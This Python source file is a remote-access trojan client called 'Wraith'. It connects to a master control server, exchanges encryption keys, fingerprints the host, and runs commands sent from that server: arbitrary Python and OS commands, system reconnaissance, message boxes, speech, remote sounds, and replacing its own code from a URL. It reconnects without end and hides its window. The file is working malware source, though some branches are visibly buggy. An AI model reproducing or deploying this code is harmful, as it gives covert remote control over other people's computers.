# Imports
import socket
import platform
import uuid
import sys
import os
import datetime
import time
import tkinter
import psutil
import playsound
import pyttsx3
import urllib.request
from io import StringIO
from tkinter import messagebox
from cryptography.fernet import Fernet
from hashlib import md5
import nacl.utils
from nacl.public import PrivateKey, Box

tkinter.Tk().withdraw()

class Wraith(object):
    def __init__(self):
        # Address of master controller server
        self.MASTER_ADDR = ("0.0.0.0",8470)

        # Wraith version
        self.WRAITH_VERSION = "1.0.5"

        # List of all commands supported by this Wraith
        self.commands = [
            ["help","Print all commands or show help about one command.\n Args: [command]\n Format: help [command]"],
            ["exec","Executes python3 code.\n Args: <code>\n Format: exec <code>"],
            ["exec-os","Executes commands on the OS.\n Args: <command>\n Format: exec-os <command>"],
            ["info","Show info about OS and hardware.\n Args: None\n Format: info"],
            ["msgbx","Display tk messagebox to user and get their reply.\n Args: <info/warning/error/yesno> <title> <message>\n Format: msgbx <info/warning/error/yesno> | <title> | <message>"],
            ["say", "Say something using TTS.\n Args: <string to say>\n Format: say <text>"],
            ["playsound", "Play a sound from the internet.\n Args: <sound URL>\n Format: playsound <sound URL>"],
            ["reconnect", "Close and reopen connection.\n Args: None\n Format: reconnect"],
            ["restart", "Restart wraith process and reconnect.\n Args: None\n Format: restart"],
            ["close", "Kill wraith process.\n Args: None\n Format: close"],
            ["update", "Update this wraith from a plaintext file on the internet.\n Args: <Update URL>\n Format: update <Update URL>"],
        ]

        # Init the tts engine for `say` command
        self.ttsengine = pyttsx3.init()
        self.ttsengine.setProperty("volume",1.0)

        # Generate an encryption key
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)

        # Get Wraith's fingerprint
        self.wraith_fingerprint = self.take_fingerprint()

        # Find if wraith is connected. Not connected by default
        self.is_connected = False

    # Create socket and connect to master control server
    def connect(self):
        # Connect
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try: self.s.connect(self.MASTER_ADDR)
        except: return False # If connection fails, return (and then retry)
        self.is_connected = True # Tell rest of program that we are connected
        # Send the encryption key to server
        if not self.handshake(self.key): return False
        # Send the fingerprint to the server in encrypted form
        self.send_data(self.wraith_fingerprint)
        return True

    # Func to get fingerprint of the hardware and software
    def take_fingerprint(self):
        si = [] # System information
        si.append(platform.node())
        si.append(platform.architecture()[0])
        si.append(platform.architecture()[1])
        si.append(platform.processor())
        si.append(platform.system())
        si.append(platform.release())
        si.append(platform.version())
        if uuid.getnode() == uuid.getnode(): si.append(str(uuid.getnode())) # If the MAC cannot be read, a random one is returned. We want to avoid that.
        text = '#'.join(si)
        fp_md5_sum = md5()
        fp_md5_sum.update(text.encode())
        return fp_md5_sum.hexdigest()

    def handshake(self, fernet_key):
        try:
            my_priv_key = PrivateKey.generate()
            my_publ_key = my_priv_key.public_key
            self.send_data(my_publ_key,False)
            server_publ_key = self.recv_pckt()
            my_box = Box(my_priv_key, server_publ_key)
            encrypted_key = my_box.encrypt(fernet_key)
            self.send_data(encrypted_key)
            return True
        except: return False

    def send_data(self, data, encryption=True):
        if self.is_connected:
            # Try to encode the data. If this fails, it is already encoded.
            try: data = data.encode()
            except AttributeError: pass
            # Only encrypt if the encrypt param in true
            if encryption: data = self.fernet.encrypt(data)
            else: data = "ctxt;".encode() + data # If not, attatch a header to let wraith know it is cleartext
            self.s.send(data+"\0".encode())
            return True
        else: return False

    # Loop to receive commands and messages
    def recv_pckt(self):
        while self.is_connected:
            buffer = "" # Clear buffer
            while self.is_connected:
                # This solution is used instead of recv(1024) for example to make splitting messages easier
                data = self.s.recv(1).decode()
                if data == "": # If the server disconnects
                    self.disconnect()
                    return False # Later reconnect
                elif data == "\0":
                    break # End of message. Process it.
                else: buffer += data # Add char to data
            if buffer == "ctxt;ctp": continue # If it's just a connection test packet, ignore it
            try:
                if buffer.startswith("ctxt;"): # If it is cleartext
                    return buffer.replace("ctxt;", "", 1)
                else: # If encrypted
                    return self.fernet.decrypt(buffer.encode())
            except: pass

    # Process commands from master
    def process_input(self, inpt):
        inpt = inpt.decode()
        try:
            if inpt.startswith("help"):
                if inpt == "help":
                    help_menu = "Wraith v{} command list:\nNOTE: Arguments in [square brackets] are not required.".format(self.WRAITH_VERSION)
                    for command in self.commands:
                        help_menu += "\n"+str(self.commands.index(command)+1)+") "+command[0]+" - "+command[1]
                    return help_menu
                else:
                    inpt = inpt.replace("help ","",1)
                    for command in self.commands:
                        if command[0] == inpt.strip(): return "{} - {}".format(command[0],command[1])
                    return "ERR: This command is unrecognised!"
            elif inpt.startswith("exec "):
                with stdout_redirect() as sr:
                    exec(inpt.replace("exec ","",1))
                    return "Code executed successfully! Result:\n{}".format(str(sr))
            elif inpt.startswith("exec-os "):
                with stdout_redirect() as sr:
                    exec("os.system({})".format(inpt.replace("exec ","",1)))
                    return "Code executed successfully! Result:\n{}".format(str(sr))
            elif inpt == "info":
                current_process = psutil.Process()
                system_info = {
                "wraith_version": self.WRAITH_VERSION,
                "wraith_fingerprint": self.wraith_fingerprint,
                "system_name": platform.node(),
                "os": platform.system(),
                "os_version": platform.version(),
                "architecture": platform.architecture(),
                "system_time": str(datetime.datetime.now()),
                "working_dir": os.getcwd(),
                "cpu_usage": psutil.cpu_percent(interval=1),
                "physical_cpu_cores": psutil.cpu_count(logical=False),
                "total_ram": psutil.virtual_memory().total,
                "free_ram": psutil.virtual_memory().free,
                "wraith_host_user": current_process.username(),
                "wraith_start_time": datetime.datetime.fromtimestamp(current_process.create_time()).strftime("%H:%M:%S %Y-%m-%d"),
                "process_priority": current_process.nice(),
                }
                system_info_string = "Wraith Version: v{}\nWraith Fingerprint: {}\nSystem Name: {}\nOS: {}\nOS Version: {}\nArchitecture: {}\nSystem Time: {}\nCPU Usage: {}%\nPhysical CPU Cores: {}\nTotal RAM: {}\nFree RAM: {}\nWraith Host User: {}\nWraith Start Time: {}\nWraith Process Priority: {}".format(str(system_info["wraith_version"]).strip(),str(system_info["wraith_fingerprint"]).strip(),str(system_info["system_name"]).strip(),str(system_info["os"]).strip(),str(system_info["os_version"]).strip(),str(system_info["architecture"]).strip(),str(system_info["system_time"]).strip(),str(system_info["cpu_usage"]).strip(),str(system_info["physical_cpu_cores"]).strip(),str(system_info["total_ram"]).strip(),str(system_info["free_ram"]).strip(),str(system_info["wraith_host_user"]).strip(),str(system_info["wraith_start_time"]).strip(),str(system_info["process_priority"]).strip())
                return system_info_string
            elif inpt.startswith("msgbx "):
                args = inpt.replace("msgbx ","",1).split(" | ")
                if len(args) != 3: return "ERR: 3 arguments are required: <type>, <title> and <message>!"
                if args[0] == "info": user_reaction = tkinter.messagebox.showinfo(args[1],args[2])
                elif args[0] == "warning": user_reaction = tkinter.messagebox.showwarning(args[1],args[2])
                elif args[0] == "error": user_reaction = tkinter.messagebox.showerror(args[1],args[2])
                elif args[0] == "yesno": user_reaction = tkinter.messagebox.askquestion(args[1],args[2])
                else: return "ERR: Invalid type of messagebox!"
                return "Successfully displayed messagebox! User replied with: {}.".format(user_reaction)
            elif inpt.startswith("say "):
                self.ttsengine.stop()
                self.ttsengine.say(inpt.replace("say ","",1))
                self.ttsengine.runAndWait()
                return "Successfully said text!"
            elif inpt.startswith("playsound "):
                playsound.playsound(inpt.replace("playsound ","",1))
                return "Successfully played sound!"
            elif inpt == "reconnect":
                self.disconnect()
                return ""
            elif inpt == "restart":
                self.disconnect()
                time.sleep(1)
                os.execv(__file__, sys.argv)
            elif inpt == "close":
                psutil.Process().terminate()
            elif inpt.startswith("update "):
                updated_code = urllib.request.urlopen(inpt.replace("update ","",1))
                with open(__file__,"w") as current_file: current_file.write(updated_code)
                return "Update processed successfully. Use `restart` to complete the update."
            else: return "ERR: Command [{}] is not recognised!".format(inpt)
        except Exception as err: return "ERR: {}".format(err)

    # Disconnect and stop wraith
    def disconnect(self):
        self.is_connected = False
        self.s.close()

# Redirect stdout to string buffer for exec and exec-os
class stdout_redirect:
    def __init__(self):
        self._stdout = None
        self._string_io = None

    def __enter__(self):
        self._stdout = sys.stdout
        sys.stdout = self._string_io = StringIO()
        return self

    def __exit__(self, type, value, traceback):
        sys.stdout = self._stdout

    def __str__(self):
        return self._string_io.getvalue()


# BEGIN
wraith = Wraith()
while True:
    try: # Do not error out, keep running
        if not wraith.is_connected:
            if not wraith.connect(): continue # If connection fails, retry
            else:
                while wraith.is_connected:
                    try: # Receive packets until connection closes in which case, reconnect
                        return_val = wraith.process_input(wraith.recv_pckt())
                        if return_val: self.send_data(return_val)
                    except: break
    except: pass
